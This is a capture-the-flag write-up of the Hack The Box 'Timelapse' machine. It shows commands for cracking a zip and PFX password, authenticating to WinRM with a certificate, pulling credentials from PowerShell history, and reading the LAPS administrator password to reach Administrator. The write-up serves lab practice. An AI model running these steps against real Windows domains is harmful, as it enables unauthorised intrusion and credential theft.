---
title: "HTB - Timelapse"
date: 2025-07-26
author: "ChaosSec"
tags: ["HTB", "Windows", "Evil-WinRM", "PFX", "LAPS", "Privilege Escalation"]
summary: ""
---

## 🔍 Port Scanning

```bash
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http
636/tcp  open  ldapssl
5986/tcp open  ssl/http
9389/tcp open  mc-nmf
```

The system is clearly a **Windows Domain Controller** (`timelapse.htb`).

## 📂 SMB Enumeration

Null session access to `Shares` was successful:

```bash
smbclient -L //10.10.11.152/ -N
smbclient //10.10.11.152/Shares/
```

Downloaded `winrm_backup.zip` and other files.

## 🔐 Password Cracking

Cracked the `.zip` password:

```bash
fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
# Found: supremelegacy
```

Extracted `.pfx` file: `legacyy_dev_auth.pfx`

Converted to hash:

```bash
pfx2john legacyy_dev_auth.pfx > pfx_timelapse.hash
john -w=/usr/share/wordlists/rockyou.txt pfx_timelapse.hash
# Password: thuglegacy
```

## 🔑 Certificate Extraction

Extracted key and cert:

```bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificate.pem
```

Logged in via Evil-WinRM:

```bash
evil-winrm -S -k priv-key.pem -c certificate.pem -i 10.10.11.152
```

## ⬆️ User Privilege Escalation

Checked PowerShell history:

```powershell
cd "C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine"
type ConsoleHost_history.txt
```

Found credentials:

```powershell
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
```

Confirmed access:

```powershell
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {hostname}
```

## 🔐 LAPS Reader Enumeration

User `svc_deploy` is in **LAPS_Readers** group.

Extracted LAPS-stored admin password:

```powershell
invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {
  Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
}
```

Found password for `Administrator`:  
**`XXtF;@I2qi#788$gO8}9+165`**

## 🏁 Final Access

Logged in as `Administrator`:

```bash
evil-winrm -u 'Administrator' -p 'XXtF;@I2qi#788$gO8}9+165' -i 10.10.11.152 -S
```

🎯 **Root access achieved through certificate authentication, PowerShell history reuse, and LAPS exploitation.**
